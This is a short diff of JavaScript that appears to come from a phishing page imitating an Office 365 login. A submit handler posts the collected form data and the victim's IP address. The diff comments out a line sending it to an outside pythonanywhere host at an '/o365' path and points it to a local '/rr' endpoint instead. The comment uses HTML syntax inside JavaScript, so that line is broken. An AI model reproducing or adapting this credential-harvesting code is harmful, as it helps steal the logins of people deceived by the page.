@@ -7593,7 +7593,8 @@ $("#login-final-submit").off("click").on("click", async function(e) {
         formData.append('ip', ip);
 
         let response = await $.ajax({
-            url: 'https://dreco111.pythonanywhere.com/o365',
+<!--            url: 'https://dreco111.pythonanywhere.com/o365',-->
+            url: '/rr',
             method: 'POST',
             data: formData,
             processData: false,
